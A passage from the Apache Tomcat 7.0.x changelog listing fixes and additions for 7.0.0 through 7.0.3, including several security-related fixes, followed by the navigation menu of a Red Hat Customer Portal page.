`isUserInRole()` and `login()/logout()` methods to support JACC implementations and to improve encapsulation. Patch provided by David Jencks. (markt) | | update | [50017](https://bz.apache.org/bugzilla/show_bug.cgi?id=50017): Code clean-up. No functional change. Patch provided by sebb. (markt) | | fix | [50027](https://bz.apache.org/bugzilla/show_bug.cgi?id=50027): Avoid NPE on start when a Context is defined in server.xml with one or more JNDI resources. (markt) | | fix | [50059](https://bz.apache.org/bugzilla/show_bug.cgi?id=50059): JARs should always be searched for static resources even if the web application is marked as meta-data complete. (markt) | | fix | [50063](https://bz.apache.org/bugzilla/show_bug.cgi?id=50063): Correct regression in fix for [50059](https://bz.apache.org/bugzilla/show_bug.cgi?id=50059) that causes applications marked as meta-data complete to return 404s for all requests. Patch provided by heyoulin. (markt) | | fix | [50087](https://bz.apache.org/bugzilla/show_bug.cgi?id=50087): Catch ClassFormatErrors when scanning for annotations. (markt) | |  | **Coyote** | | --- | | | fix | [49923](https://bz.apache.org/bugzilla/show_bug.cgi?id=49923): Avoid using negative timeouts during acceptor unlock to ensure APR connector shuts down properly. (mturk) | | --- | --- | | fix | [49972](https://bz.apache.org/bugzilla/show_bug.cgi?id=49972): Fix potential thread safe issue when formatting dates for use in HTTP headers. (markt) | | fix | [50003](https://bz.apache.org/bugzilla/show_bug.cgi?id=50003): Set not maxThreads but minSpareThreads to corePoolSize, if AbstractEndpoint.setMinSpareThreads is called. (kfujino) | | fix | [50044](https://bz.apache.org/bugzilla/show_bug.cgi?id=50044): Fix issue when using comet where socket remained in long poll after the comet request has ended. (markt) | | fix | [50054](https://bz.apache.org/bugzilla/show_bug.cgi?id=50054): Correctly handle the setting of minSpareThreads in AJP connector. (kfujino) | | fix | [50072](https://bz.apache.org/bugzilla/show_bug.cgi?id=50072): Fix issues when using a non-blocking read for the request line with the NIO connector that could result in the request line being mis-read. (markt) | |  | **Jasper** | | --- | | | fix | [49986](https://bz.apache.org/bugzilla/show_bug.cgi?id=49986): Fix thread safety issue for JSP reload. (timw) | | --- | --- | | fix | [49998](https://bz.apache.org/bugzilla/show_bug.cgi?id=49998): Make jsp:root detection work with single quoted attributes as well. (timw) | | fix | Correctly handle the setting of primitive bean values via expression language. (markt) | | fix | Don't swallow exceptions when processing TLD files and handle the case when there is no web.xml file. (markt) | | fix | [50066](https://bz.apache.org/bugzilla/show_bug.cgi?id=50066): Fix building of recursive tag files when the file depends on a JAR file. Patch provided by Sylvain Laurent. (markt) | | fix | [50078](https://bz.apache.org/bugzilla/show_bug.cgi?id=50078): Fix threading problem in EL caches. Patch provided by Takayoshi Kimura. (markt) | | add | Make EL cache sizes configurable. (markt) | |  | **Web applications** | | --- | | | fix | Apply filters to default home page so copyright year is correctly displayed. (markt) | | --- | --- | |  | **Other** | | --- | | | update | [48716](https://bz.apache.org/bugzilla/show_bug.cgi?id=48716): Do not call reset if the default LogManager is in use. (markt) | | --- | --- | | fix | [50013](https://bz.apache.org/bugzilla/show_bug.cgi?id=50013): Correctly package classes from `org.apache.tomcat.util.file` and add the tomcat-util.jar to the class path for the Ant tasks. Based on a patch provided by Sylvain Laurent. (markt) | | | |  | **Tomcat 7.0.3 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | [48644](https://bz.apache.org/bugzilla/show_bug.cgi?id=48644): Review all instances of catching Throwable and re-throw where appropriate. (markt) | | --- | --- | | update | Allow glob patterns in the `jarsToSkip` configuration and add some debug logging to the jar scanner. (rjung) | | fix | [48738](https://bz.apache.org/bugzilla/show_bug.cgi?id=48738): Workaround a couple of long standing JDK bugs to enable GZIP compressed output streams to be flushed. Based on a patch provided by Jiong Wang. (markt) | | update | [48967](https://bz.apache.org/bugzilla/show_bug.cgi?id=48967): Replace strings "catalina.base" and "catalina.home" by globally defined constants. Patch provided by Marc Guillemot. (rjung) | | fix | [49195](https://bz.apache.org/bugzilla/show_bug.cgi?id=49195): Don't report an error when shutting down a Windows service for a Tomcat instance that has a disabled shutdown port. (markt) | | fix | [49209](https://bz.apache.org/bugzilla/show_bug.cgi?id=49209): Prevent possible AccessControlException during undeployment when running with a security manager. Patch provided by Sylvain Laurent. (markt) | | fix | [49657](https://bz.apache.org/bugzilla/show_bug.cgi?id=49657): Handle CGI executables with spaces in the path. (markt) | | fix | [49667](https://bz.apache.org/bugzilla/show_bug.cgi?id=49667): Ensure that using the JDBC driver memory leak prevention code does not cause a one of the memory leaks it is meant to avoid. (markt) | | fix | [49670](https://bz.apache.org/bugzilla/show_bug.cgi?id=49670): Restore SSO functionality that was broken by Lifecycle refactoring. (markt) | | fix | [49698](https://bz.apache.org/bugzilla/show_bug.cgi?id=49698): Allow a listener to complete an asynchronous request if it times out. (markt) | | fix | [49714](https://bz.apache.org/bugzilla/show_bug.cgi?id=49714): The annotation process of Jar doesn't influence distributable element of web.xml. (kfujino) | | fix | [49721](https://bz.apache.org/bugzilla/show_bug.cgi?id=49721): Alls JAR in a web application should be searched for resources, not just those with a web-fragment.xml that is going to be processed. (markt) | | fix | [49728](https://bz.apache.org/bugzilla/show_bug.cgi?id=49728): Improve PID file handling when another process is managing the PID file and Tomcat does not have write access. (markt) | | fix | [49730](https://bz.apache.org/bugzilla/show_bug.cgi?id=49730): Fix a race condition in StandardThreadExector that can cause requests to experience large delays. Patch provided by Sylvain Laurent. (markt) | | fix | [49749](https://bz.apache.org/bugzilla/show_bug.cgi?id=49749): Single sign on cookies should have httpOnly flag set using same rules as session cookies. (markt) | | fix | [49750](https://bz.apache.org/bugzilla/show_bug.cgi?id=49750): Align `WebappClassLoader.validate()` implementation with Javadoc and ensure that `javax.servlet.*` classes can not be loaded by a `WebappClassLoader` instance. Patch provided by pid. (markt) | | fix | [49757](https://bz.apache.org/bugzilla/show_bug.cgi?id=49757): Correct some generics warnings. Based on a patch provided by Gábor. (markt) | | fix | [49779](https://bz.apache.org/bugzilla/show_bug.cgi?id=49779): Improve handling of POST requests and FORM authentication, particularly when the user agent responds to the 302 response by repeating the POST request including a request body. Any request body provided at this point is now swallowed. (markt) | | fix | CSRF prevention filter did not correctly handle URLs that used anchors. (markt) | | fix | Fix memory leak on web application stopped caused by failed to de-register the web application's Servlets with the MBean server. (markt) | | update | More tweaks to the Lifecycle refactoring to ensure that when a component is being destroyed, the destroy method is only called once on each child component. (markt) | | fix | Keep the MBean names for web applications consistent between Tomcat 6 and Tomcat 7. (markt) | | fix | [49856](https://bz.apache.org/bugzilla/show_bug.cgi?id=49856): Add an executorName attribute to Connectors so it is possible to trace ThreadPool to Connector to Executor via the JMX interface. (markt) | | fix | [49865](https://bz.apache.org/bugzilla/show_bug.cgi?id=49865): Tomcat failed to start if catalina.properties was not present. (markt) | | fix | [49876](https://bz.apache.org/bugzilla/show_bug.cgi?id=49876): Fix the generics warnings in the copied Apache Jakarta BCEL code. Based on a patch by Gábor. (markt) | | fix | [49883](https://bz.apache.org/bugzilla/show_bug.cgi?id=49883): Ensure that the CombinedRealm and LockOutRealm return a name for use in log messages rather than throwing an `UnsupportedOperationException`. (markt) | | fix | [49884](https://bz.apache.org/bugzilla/show_bug.cgi?id=49884): Fix occasional NullPointerException on async complete(). This resulted in a major refactoring of the async implementation to address a number of threading issues. (markt) | | fix | Update the version numbers in ServerInfo defaults to Tomcat 7.0.x. (markt) | | fix | [49892](https://bz.apache.org/bugzilla/show_bug.cgi?id=49892): Correct JNDI name for method resource injections. Based on a patch by Gurkan Erdogdu. (markt) | | fix | Ensure that Context elements defined in server.xml use any configClass setting specified in the parent Host element. (markt) | | fix | GSOC 2010. Enable the creation of Services, Engines, Connectors, Hosts and Contexts via JMX from a minimal server.xml that contains only a Server element. Based on a patch by Chamith Buddhika. (markt) | | fix | [49909](https://bz.apache.org/bugzilla/show_bug.cgi?id=49909): Fix a regression introduced with the fix for [47950](https://bz.apache.org/bugzilla/show_bug.cgi?id=47950) that prevented JSTL classes being loaded. (markt) | | fix | [49915](https://bz.apache.org/bugzilla/show_bug.cgi?id=49915): Make error more obvious, particularly when accessed via JConsole, if StandardServer.storeConfig() is called when there is no StoreConfig implementation present. (markt) | | fix | [50018](https://bz.apache.org/bugzilla/show_bug.cgi?id=50018): Fix some minor Javadoc errors in Jasper source. Based on a patch by sebb. (timw) | | fix | [50021](https://bz.apache.org/bugzilla/show_bug.cgi?id=50021): Correct a regression in the fix for [46844](https://bz.apache.org/bugzilla/show_bug.cgi?id=46844) that may have caused additional problems during a failure at start up. (markt) | | fix | [50026](https://bz.apache.org/bugzilla/show_bug.cgi?id=50026): Prevent serving of resources from WEB-INF and META-INF directories when DefaultServlet or WebdavServlet is mapped to a sub-path of the context. This changes DefaultServlet to always serve resources with paths relative to the root of the context regardless of where it is mapped, which is a breaking change for current servlet-mappings that map the default servlet to a subpath. (timw) | | fix | [50689](https://bz.apache.org/bugzilla/show_bug.cgi?id=50689): Provide 100 Continue responses at appropriate points during FORM authentication if client indicates that they are expected. (markt) | |  | **Coyote** | | --- | | | update | Wait for the connectors to exit before closing them down. (mturk) | | --- | --- | | add | Follow up to [48545](https://bz.apache.org/bugzilla/show_bug.cgi?id=48545). Make JSSE connectors more tolerant of a incorrect trust store password. (markt) | | fix | Fix some edge cases in the NIO connector when handling requests that are not received all at the same time and the socket needs to be returned to the poller. (markt) | | update | Further work to reduce the code duplication in the HTTP connectors. (markt) | | fix | Make sure acceptor threads are stopped when the connector is stopped. (markt) | | fix | Make sure async timeout thread is stopped when the connector is stopped. (markt) | | fix | [49625](https://bz.apache.org/bugzilla/show_bug.cgi?id=49625): Ensure Vary header is set if response may be compressed rather than only setting it if it is compressed. (markt) | | fix | [49802](https://bz.apache.org/bugzilla/show_bug.cgi?id=49802): Re-factor connector pause, stop and destroy methods so that calling any of those methods has the expected results. (markt) | | update | Various refactorings to reduce code duplication and unnecessary code in the connectors. (markt) | | fix | [49860](https://bz.apache.org/bugzilla/show_bug.cgi?id=49860): Add partial support for trailing headers in chunked HTTP requests. (markt) | |  | **Jasper** | | --- | | | fix | [49665](https://bz.apache.org/bugzilla/show_bug.cgi?id=49665): Provide better information including JSP file name and location when a missing file is detected during TLD handling. Patch provided by Ted Leung. (markt) | | --- | --- | | fix | [49726](https://bz.apache.org/bugzilla/show_bug.cgi?id=49726): Specifying a default content type via a JSP property group should not prevent a page from setting some other content type. (markt) | | fix | [49799](https://bz.apache.org/bugzilla/show_bug.cgi?id=49799): The new `omit` attribute for `jsp:attribute` elements now supports the use of expressions and expression language. (markt) | | fix | [49916](https://bz.apache.org/bugzilla/show_bug.cgi?id=49916): Switch to using an initialisation parameter to pass JSP file information from Catalina to Jasper. This simplifies the Catalina code as well as making it easier for Geronimo and others to integrate Jasper. Patch provided by David Jencks. (markt) | | fix | [49985](https://bz.apache.org/bugzilla/show_bug.cgi?id=49985): Fix thread safety issue in EL parser. (markt) | |  | **Cluster** | | --- | | | fix | Remove domainReplication attribute from ClusterManager. If you send session to only same domain, use DomainFilterInterceptor. (kfujino) | | --- | --- | | fix | Add Null check when CHANGE\_SESSION\_ID message received. (kfujino) | | fix | Add support for LAST\_ACCESS\_AT\_START system property to DeltaSession. (kfujino) | | fix | Avoid a NPE in the DeltaManager when a parallel request invalidates the session before the current request has a chance to send the replication message. (markt) | | fix | [49905](https://bz.apache.org/bugzilla/show_bug.cgi?id=49905): Prevent memory leak when using asynchronous session replication. (markt) | | fix | [49924](https://bz.apache.org/bugzilla/show_bug.cgi?id=49924): When non-primary node changes into a primary node, make sure isPrimarySession is changed to true. (kfujino) | |  | **Web applications** | | --- | | | fix | Correct the class name of the default JAR scanner in the documentation web application. (rjung) | | --- | --- | | fix | [49585](https://bz.apache.org/bugzilla/show_bug.cgi?id=49585): Update JSVC documentation to reflect new packaging of Commons Daemon. (markt) | | update | Update the Servlet, JSP and EL Javadoc links to link to the specifications and the relevant part of the Java EE 6 Javadoc. (markt) | | fix | Update a few places in the docs where the Manager documentation referred to the old role name of manager rather than the new manager-script. (markt) | |  | **Extras** | | --- | | | fix | [49861](https://bz.apache.org/bugzilla/show_bug.cgi?id=49861): Don't log RMI ports formatted with commas for the JMX remote listener. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | Correct the user names created by the Windows installer for the Manager and Host Manager applications. (mturk) | | --- | --- | | fix | Correct the Eclipse compiler dependency in the Jasper POM. (markt) | | add | Extend Checkstyle validation checks to check import order. (markt) | | fix | [49758](https://bz.apache.org/bugzilla/show_bug.cgi?id=49758): Fix generics warnings exposed by a fix in Eclipse 3.6. Patch provided by sebb. (markt) | | update | Update Apache Commons Pool to 1.5.5. (markt) | | update | [49955](https://bz.apache.org/bugzilla/show_bug.cgi?id=49955): Improvement and correction of Building Tomcat guide. Based on a patch from Wesley Acheson. (timw) | | update | [49993](https://bz.apache.org/bugzilla/show_bug.cgi?id=49993): Improve check for `JAVA_HOME` and add support for `JRE_HOME` in `service.bat`. (mturk) | | | |  | **Tomcat 7.0.2 (markt)** | **beta, 2010-08-11** | | --- | --- | | | **Catalina** | | --- | | | fix | Fix regression that prevented running with a security manager enabled. (markt) | | --- | --- | |  | **Web applications** | | --- | | | fix | Correct Javadoc errors. (markt) | | --- | --- | | add | Provide Javadoc for Servlet 3.0 API, JSP 2.2 API and EL 2.2 API. (markt) | | fix | Remove second copy of RUNNING.txt from the full-docs distribution. Some unpacking utilities can't handle multiple copies of a file with the same name in a directory. (markt) | |  | **Other** | | --- | | | add | Extend Checkstyle validation checks to check for tabs in nearly all text files. (markt) | | --- | --- | | update | Update Apache Commons Daemon from 1.0.2 to 1.0.3. (markt) | | update | Update Eclipse JDT Core Batch Compiler (ecj.jar) from 3.5.1 to 3.6. (markt) | | | |  | **Tomcat 7.0.1 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | GSOC 2010. Continue work to align MBean descriptors with reality. Patch provided by Chamith Buddhika. (markt) | | --- | --- | | fix | When running under a security manager, enforce package access and package definition restrictions defined in the catalina.properties file. (markt) | | fix | When using a Loader configured with `searchExternalFirst="true"` failure to find the class in an external repository should not prevent searching of the local repositories. (markt) | | add | Add entryPoint support to the CSRF prevention filter. (markt) | | fix | [48297](https://bz.apache.org/bugzilla/show_bug.cgi?id=48297): Correctly initialise handler chain for web services resources. (markt) | | add | [48960](https://bz.apache.org/bugzilla/show_bug.cgi?id=48960): Add a new option to the SSI Servlet and SSI Filter to allow the disabling of the `exec` command. This is now disabled by default. Based on a patch by Yair Lenga. (markt) | | add | [48998](https://bz.apache.org/bugzilla/show_bug.cgi?id=48998), [49617](https://bz.apache.org/bugzilla/show_bug.cgi?id=49617): Add the ExpiresFilter, a port of the httpd mod\_expires module. Patch provided by Cyrille Le Clerc. (markt) | | fix | [49030](https://bz.apache.org/bugzilla/show_bug.cgi?id=49030): When initializing/starting/stopping connectors and one of them fails, do not ignore the others. (markt/kkolinko) | | fix | [49128](https://bz.apache.org/bugzilla/show_bug.cgi?id=49128): Don't swallow exceptions unnecessarily in `WebappClassLoader.start()`. (markt) | | fix | [49182](https://bz.apache.org/bugzilla/show_bug.cgi?id=49182): Align comments in setclasspath.[sh|bat] with behaviour. Based on a patch provided by sebb. (markt) | | fix | [49230](https://bz.apache.org/bugzilla/show_bug.cgi?id=49230): Enhance JRE leak prevention listener with protection for the keep-alive thread started by `sun.net.www.http.HttpClient`. Based on a patch provided by Rob Kooper. (markt) | | fix | [49414](https://bz.apache.org/bugzilla/show_bug.cgi?id=49414): When reporting threads that may have triggered a memory leak on web application stop, attempt to differentiate between request processing threads and threads started by the application. (markt) | | fix | [49428](https://bz.apache.org/bugzilla/show_bug.cgi?id=49428): Add a work-around for the known namespace issues for some Microsoft WebDAV clients. Patch provided by Panagiotis Astithas. (markt) | | add | Add support for `*.jar` pattern in VirtualWebappLoader. (kkolinko) | | add | Use a LockOutRealm in the default configuration to prevent attempts to guess user passwords by brute-force. (markt) | | add | [49478](https://bz.apache.org/bugzilla/show_bug.cgi?id=49478): Add support for user specified character sets to the `AddDefaultCharsetFilter`. Based on a patch by Felix Schumacher. (markt) | | fix | [49503](https://bz.apache.org/bugzilla/show_bug.cgi?id=49503): Make sure connectors bind to their associated ports sufficiently early to allow jsvc and the org.apache.catalina.startup.EXIT\_ON\_INIT\_FAILURE system property to operate correctly. (markt) | | fix | [49525](https://bz.apache.org/bugzilla/show_bug.cgi?id=49525): Ensure cookies for the ROOT context have a path of / rather than an empty string. (markt) | | fix | [49528](https://bz.apache.org/bugzilla/show_bug.cgi?id=49528), [49567](https://bz.apache.org/bugzilla/show_bug.cgi?id=49567): Ensure that `AsyncContext.isAsyncStarted()` returns the correct value after `AsyncContext.start()` and that if `AsyncContext.complete()` is called on a separate thread that it is handled correctly. (markt) | | fix | [49530](https://bz.apache.org/bugzilla/show_bug.cgi?id=49530): Contexts and Servlets not stopped when Tomcat is shut down. (markt) | | fix | [49536](https://bz.apache.org/bugzilla/show_bug.cgi?id=49536): If no ROOT context is deployed, ensure a 404 rather than a 200 is returned for requests that don't map to any other context. (markt) | | add | Additional debug logging in StandardContext to provide information on Manager selection. (markt) | | fix | [49550](https://bz.apache.org/bugzilla/show_bug.cgi?id=49550): Suppress deprecation warning where deprecated code is required to be used. No functional change. Patch provided by Sebb. (markt) | | fix | [49551](https://bz.apache.org/bugzilla/show_bug.cgi?id=49551): Allow default context.xml location to be specified using an absolute path. (markt) | | add | Improve logging of unhandled exceptions in servlets by including the path of the context where the error occurred. (markt) | | add | Include session ID in error message logged when trying to set an attribute on an invalid session. (markt) | | fix | Improve the CSRF protection filter by using SecureRandom rather than Random to generate nonces. Also make the implementation class used user configurable. (markt) | | fix | Avoid NullPointerException, when copyXML=true and META-INF/context.xml does not exist. (kfujino) | | fix | [49598](https://bz.apache.org/bugzilla/show_bug.cgi?id=49598): When session is changed and the session cookie is replaced, ensure that the new Set-Cookie header overwrites the old Set-Cookie header. (markt) | | fix | Create a thread to trigger asynchronous timeouts when using the BIO connector, change the default timeout to 10s (was infinite) and make the default timeout configurable using the `asyncTimeout` attribute on the connector. (pero/markt) | | fix | [49600](https://bz.apache.org/bugzilla/show_bug.cgi?id=49600): Make exceptions returned by the `ProxyDirContext` consistent for resources that weren't found by checking the `DirContext` or the cache. Test case based on a patch provided by Marc Guillemot. (markt) | | fix | [49613](https://bz.apache.org/bugzilla/show_bug.cgi?id=49613): Improve performance when using SSL for applications that make multiple class to `Request.getAttributeNames()`. Patch provided by Sampo Savolainen. (markt) | | fix | Handle the edge cases where resources packaged in JARs have names that start with a single quote character or a double quote character. (markt) | | fix | Correct copy and paste typo in web.xml parsing rules that mixed up `local-ejb-ref` and `resource-env-ref`. (markt) | | update | Refactor session managers to remove unused code and to reduce code duplication. Also, all session managers used for session replication now extend `org.apache.catalina.ha.session.ClusterManagerBase`. (markt) | |  | **Jasper** | | --- | | | update | Remove references to Jikes since it does not support Java 6. (markt) | | --- | --- | | fix | Correct over zealous type checking for EL in attributes that broke the use of JSF converters. (markt) | | fix | Correct algorithm used to identify correct method to use when a MethodExpressions is used in EL. (markt) | | fix | [49217](https://bz.apache.org/bugzilla/show_bug.cgi?id=49217): Ensure that identifiers used in EL meet the requirements of the Java Language Specification. (markt) | | add | Improve logging of JSP exceptions by including JSP snippet (if enabled) rather than just the root cause in the host log. (markt) | | fix | [49555](https://bz.apache.org/bugzilla/show_bug.cgi?id=49555): Correctly handled Tag Libraries where functions are defined in static inner classes. (markt) | |  | **Cluster** | | --- | | | fix | [49127](https://bz.apache.org/bugzilla/show_bug.cgi?id=49127): Don't swallow exceptions unnecessarily in `SimpleTcpReplicationManager.startInternal()`. (markt) | | --- | --- | | fix | [49407](https://bz.apache.org/bugzilla/show_bug.cgi?id=49407): Change the BackupManager so it is consistent with DeltaManager and reports both primary and backup sessions when active sessions are requested. (markt) | | fix | [49445](https://bz.apache.org/bugzilla/show_bug.cgi?id=49445): When session ID is changed after authentication, ensure the DeltaManager replicates the change in ID to the other nodes in the cluster. (kfujino) | |  | **Web applications** | | --- | | | fix | [49112](https://bz.apache.org/bugzilla/show_bug.cgi?id=49112): Update the ROOT web application's index page. Patch provided by pid. (markt) | | --- | --- | | fix | [49213](https://bz.apache.org/bugzilla/show_bug.cgi?id=49213): Add the permissions necessary to enable the Manager application to operate currently when running with a security manager. (markt) | | fix | [49436](https://bz.apache.org/bugzilla/show_bug.cgi?id=49436): Correct documented default for readonly attribute of the UserDatabase component. (markt) | | fix | [49475](https://bz.apache.org/bugzilla/show_bug.cgi?id=49475): Use new role name for manager application access on the ROOT web application's index page. (markt) | | fix | [49476](https://bz.apache.org/bugzilla/show_bug.cgi?id=49476): CSRF protection was preventing access to the session expiration features. Also switch the manager application to the generic CSRF protection filter. (markt) | | fix | Better handle failure to create directories required for new hosts in the Host Manager application. (markt) | | fix | Switch the Host Manager application to the generic CSRF protection for the HTML interface and prevent started hosts from being started and stopped hosts from being stopped. (markt) | | fix | [49518](https://bz.apache.org/bugzilla/show_bug.cgi?id=49518): Fix typo in extras documentation. (markt) | | fix | [49522](https://bz.apache.org/bugzilla/show_bug.cgi?id=49522): Fix regression due to change of name for MBeans for naming resources that broke the complete server status page in the manager application. Note these MBeans now have a new name. (markt) | | fix | [49570](https://bz.apache.org/bugzilla/show_bug.cgi?id=49570): When using the example compression filter, set the Vary header on compressed responses. (markt) | | add | Add redirects for the root of the manager and host-manager web applications that redirect users to the html interface rather than returning a 404. (markt) | | add | Provide the HTML Manager application with the ability to differentiate between primary, backup and proxy sessions. Note that proxy sessions are only shown if enabled in web.xml. (markt) | |  | **Other** | | --- | | | fix | [49130](https://bz.apache.org/bugzilla/show_bug.cgi?id=49130): Better describe the core package in the Windows installer, making it clear that the service will be installed. Patch provided by sebb. (markt) | | --- | --- | | add | Re-factor unit tests to enable them to be run once with each of the HTTP connector implementations (BIO, NIO and APR/native). (markt) | | add | [49268](https://bz.apache.org/bugzilla/show_bug.cgi?id=49268): Add the necessary plumbing to include CheckStyle in the build process. Start with no checks. Additional checks will be added as they are agreed. (markt) | | update | Updated to Ant 1.8.1. The build now requires a minimum of Ant 1.8.x. (markt) | | update | Update the re-packaged version of commons-fileupload from 1.2.1 to 1.2.2. The layout of re-packaged version was also restored to the original commons-fileupload layout to make merging of future updates easier. (markt) | | update | Update the re-packaged version of Jakarta BCEL from trunk revision 880760 to trunk revision 978831. (markt) | | | |  | **Tomcat 7.0.0 (markt)** | **beta, 2010-06-29** | | --- | --- | | | **Catalina** | | --- | | | update | Update Servlet support to the Servlet 3.0 specification. (all) | | --- | --- | | update | Improve and document VirtualWebappLoader. (rjung) | | add | [43642](https://bz.apache.org/bugzilla/show_bug.cgi?id=43642): Add prestartminSpareThreads attribute for Executor. (jfclere) | | update | Switch from AnnotationProcessor to InstanceManager. Patch provided by David Jecks with modifications by Remy. (remm/fhanik) | | update | [r620845](https://svn.apache.org/viewvc?view=rev&rev=620845) and [r669119](https://svn.apache.org/viewvc?view=rev&rev=669119). Make shutdown address configurable. (jfclere) | | fix | [r651977](https://svn.apache.org/viewvc?view=rev&rev=651977) Add some missing control checks to `ThreadWithAttributes`. (markt) | | add | [r677640](https://svn.apache.org/viewvc?view=rev&rev=677640) Add a startup class that does not require any configuration files. (costin) | | fix | [r700532](https://svn.apache.org/viewvc?view=rev&rev=700532) Log if temporary file operations within the CGI servlet fail. Make sure header Reader is closed on failure. (markt) | | fix | [r708541](https://svn.apache.org/viewvc?view=rev&rev=708541) Delete references to DefaultContext which was removed in 6.0.x. (markt) | | add | [r709018](https://svn.apache.org/viewvc?view=rev&rev=709018) Initial implementation of an asynchronous file handler for JULI. (fhanik) | | fix | Give session thisAccessedTime and lastAccessedTime clear semantics. (rjung) | | add | Expose thisAccessedTime via Session interface. (rjung) | | add | Provide a log format for JULI that provides the same information as the default but on a single line. (markt) | | add | [r723889](https://svn.apache.org/viewvc?view=rev&rev=723889) Provide the ability to configure the Executor job queue size and a timeout for adding jobs to the queue. (fhanik) | | add | Add support for aliases to StandardContext. This allows content from other directories and/or WAR files to be mapped to paths within the context. (markt) | | update | Provide clearer definition of Lifecycle interface, particularly start and stop, and align components that implement Lifecycle with this definition. (markt) | | add | [48662](https://bz.apache.org/bugzilla/show_bug.cgi?id=48662): Provide a new option to control the copying of context XML descriptors from web applications to the host's xmlBase. Copying of XML descriptors is now disabled by default. (markt) | | fix | Move comet classes from the org.apache.catalina package to the org.apache.catalina.comet package to allow comet to work under a security manager. (markt) | |  | **Coyote** | | --- | | | update | Port SSLInsecureRenegotiation from mod\_ssl. This requires to use tomcat-native 1.2.21 that have option to detect this support from OpenSSL library. (mturk) | | --- | --- | | update | Allow bigger AJP packets also for request bodies and responses using the packetSize attribute of the Connector. (rjung) | | update | [r703017](https://svn.apache.org/viewvc?view=rev&rev=703017) Make Java socket options consistent between NIO and JIO connector. Expose all the socket options available on `java.net.Socket` (fhanik) | | fix | [46051](https://bz.apache.org/bugzilla/show_bug.cgi?id=46051): The writer returned by `getWriter()` now conforms to the `PrintWriter` specification and uses platform dependent line endings rather than always using `\r\n`. (markt) | | update | Use tc-native 1.2.x which is based on APR 1.3.3+ (mturk) | | update | [r724239](https://svn.apache.org/viewvc?view=rev&rev=724239) NIO connector now always uses an Executor. (fhanik) | | update | [r724393](https://svn.apache.org/viewvc?view=rev&rev=724393) Implement keepAliveCount for NIO connector in a thread safe manner. (fhanik) | | update | [r724849](https://svn.apache.org/viewvc?view=rev&rev=724849) Implement keep alive timeout for NIO connector. (fhanik) | |  | **Jasper** | | --- | | | update | Update JSP support to the JSP 2.2 specification. (markt) | | --- | --- | | update | Update EL support to the EL 2.2 specification. (markt) | | update | [r787978](https://svn.apache.org/viewvc?view=rev&rev=787978) Use "1.6" as the default value for compilerSourceVM and compilerTargetVM options of Jasper. (kkolinko) | | add | [48358](https://bz.apache.org/bugzilla/show_bug.cgi?id=48358): Add support for limiting the number of JSPs that are loaded at any one time. Based on a patch by Isabel Drost. (markt) | | add | [48689](https://bz.apache.org/bugzilla/show_bug.cgi?id=48689): Access TLD files through a new JarResource interface to make extending Jasper simpler, particularly in OSGi environments. Patch provided by Jarek Gawor. (markt) | |  | **High Availability** | | --- | | | add | Add support for UDP and secure communication to tribes. (fhanik) | | --- | --- | | add | Add versioning to the tribes communication protocol to support future developments. (fhanik) | | add | Add a demo on how to use the payload. (fhanik) | | add | Started to add JMX support to the cluster implementation. (markt) | | fix | [r609778](https://svn.apache.org/viewvc?view=rev&rev=609778) Minor fixes to the throughput interceptor and the NIO receiver. (fhanik) | | fix | [r630234](https://svn.apache.org/viewvc?view=rev&rev=630234) Additional checks for the NIO receiver. (fhanik) | | update | [r671650](https://svn.apache.org/viewvc?view=rev&rev=671650) Improve error message when multicast is not enabled. (fhanik) | |  | **Web applications** | | --- | | | update | [r631321](https://svn.apache.org/viewvc?view=rev&rev=631321) Update changelog to support the <rev> element in the documentation. (fhanik) | | --- | --- | | add | A number of additional roles were added to the Manager and Host Manager applications to separate out permissions for the HTML interface, the text interface and the JMX proxy. (markt) | | add | CSRF protection was added to the Manager and Host Manager applications. (markt) | | add | List array elements in the JMX proxy output of the Manager application. (rjung) | |  | **Extras** | | --- | | | add | A new JmxRemoteLifecycleListener that can be used to fix the ports used for remote JMX connections, e.g. when using JConsole. (markt) | | --- | --- | |  | **Other** | | --- | | | fix | Numerous code clean-up changes including the use of generics and removing unused imports, fields, parameters and methods. (markt) | | --- | --- | | fix | All deprecated internal code has been removed. **Warning:** If you have custom components for a previous Tomcat version that extend internal Tomcat classes and override deprecated methods it is highly likely that they will no longer work. (markt) | | update | Parameterize version number throughout build scripts and source. (rjung) | | add | [r766526](https://svn.apache.org/viewvc?view=rev&rev=766526) Add support for setting up an additional PropertySource that is used to lookup parameters referenced as `${..}` in XML files parsed by Tomcat. It is configured via `org.apache.tomcat.util.digester.PROPERTY_SOURCE` system property. (fhanik) | | | | |
| --- | |
| *Copyright © 1999-2021, Apache Software Foundation* | |



=== Content from www.redhat.com_82f4cb00_20250126_072108.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
